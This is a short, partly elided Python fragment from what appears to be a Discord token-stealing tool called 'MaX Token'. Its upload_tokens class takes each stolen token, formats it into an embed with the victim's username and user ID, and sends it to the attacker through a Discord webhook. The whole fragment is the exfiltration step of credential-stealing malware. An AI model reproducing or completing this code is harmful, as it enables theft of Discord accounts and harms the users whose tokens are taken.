...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed = Embed(title=f"{username} ({user_id})", color=0x4B0082)
            ...
            embed.set_footer(text="MaX made by rlxe9")

            self.webhook.send(embed=embed, username="MaX Token",
                              avatar_url="https://cdn.discordapp.com/attachments/1116772776682987611/1131300196379283617/b50d308540821fceb9c146d2f96f3a2a.webp")
